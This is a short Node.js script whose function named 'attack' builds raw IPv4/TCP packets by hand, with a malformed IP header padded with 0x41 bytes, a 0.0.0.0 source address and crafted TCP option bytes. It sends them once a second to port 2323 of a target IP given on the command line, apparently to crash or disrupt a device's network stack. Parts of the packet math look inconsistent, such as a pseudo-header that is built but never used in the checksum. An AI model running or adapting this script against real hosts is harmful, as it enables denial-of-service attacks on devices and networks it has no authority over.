var raw = require ('raw-socket');
var ip = require('ip');
var os = require('os');


function attack(targetIp) {
    var socket = raw.createSocket();
    socket.setOption (raw.SocketLevel.IPPROTO_IP, raw.SocketOption.IP_HDRINCL, new Buffer ([0x00, 0x00, 0x00, 0x01]), 4);

    console.log(targetIp);

    var sourceIp = '0.0.0.0';
    var destinationIp = targetIp;
    var sourcePort = 20;
    var destinationPort = 2323;


    var buffer = new Buffer ([
        // IP part:
        0x47,                    // IP header length
        0x00,                    // IP Explicit congestion notification
        0x00, 0x00,              // total length of this buffer (FILLED IN LATER)
        0x00, 0x01,              // IP identification
        0x00, 0x00,              // IP fragment offset
        0x40,                    // IP ttl
        0x06,                    // IP protocol (6 = TCP)
        0x00, 0x00,              // IP header checksum (FILLED IN LATER)
        0x00, 0x00, 0x00, 0x00,  // IP source ip (FILLED IN LATER)
        0x00, 0x00, 0x00, 0x00,  // IP destination ip (FILLED IN LATER)
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // IP text

        // TCP part:
        0x00, 0x00,              // TCP source port (FILLED IN LATER)
        0x00, 0x00,              // TCP destination port (FILLED IN LATER)
        0x00, 0x00, 0x00, 0x00,  // TCP sequence number
        0x00, 0x00, 0x00, 0x00,  // TCP acknowledgement number
        0xf0,                    // TCP nonce
        0x02,                    // TCP fin
        0x20, 0x00,              // TCP window size
        0x00, 0x00,              // TCP checksum (FILLED IN LATER)
        0x00, 0x00,              // TCP urgent pointer
        0x13, 0x14, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, // TCP text item
        0x13, 0x14, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32, 0x32  // TCP text item
    ]);

    var ipLength = 28;
    var tcpLength = buffer.length - ipLength;

    // complete IP part:
    ip.toBuffer(sourceIp, buffer, 12);
    ip.toBuffer(destinationIp, buffer, 16);
    if(os.endianness() == 'LE') buffer.writeUInt16LE(buffer.length, 2);
    else buffer.writeUInt16BE(buffer.length, 2);

    var ipChecksum = raw.createChecksum({
        buffer: buffer,
        offset: 0,
        length: ipLength
    });
    buffer.writeUInt16BE(ipChecksum, 10);

    // complete TCP part:
    buffer.writeUInt16BE(sourcePort, ipLength + 0);
    buffer.writeUInt16BE(destinationPort, ipLength + 2);

    var pseudoBuffer = Buffer.alloc(12, 0x00);
    ip.toBuffer(sourceIp, pseudoBuffer, 0);
    ip.toBuffer(destinationIp, pseudoBuffer, 4);
    pseudoBuffer[9] = 0x06;  // IP protocol (6 = TCP)
    pseudoBuffer.writeUInt16BE(tcpLength, 10);

    var tcpChecksum = raw.createChecksum({
        buffer: buffer,
        offset: ipLength,
        length: tcpLength
    });
    buffer.writeUInt16BE(tcpChecksum, ipLength + 16);

    function send() {
        // destination ip doesn't really matter as we are building the IP packet ourselves:
        socket.send(buffer, 0, buffer.length, destinationIp, (err, bytesSent) => {
            if(err) return console.log(err);
            console.log(`${bytesSent} bytes sent.`)
        });

        setTimeout(send, 1000);
    }

    send();
}

attack(process.argv[2]);

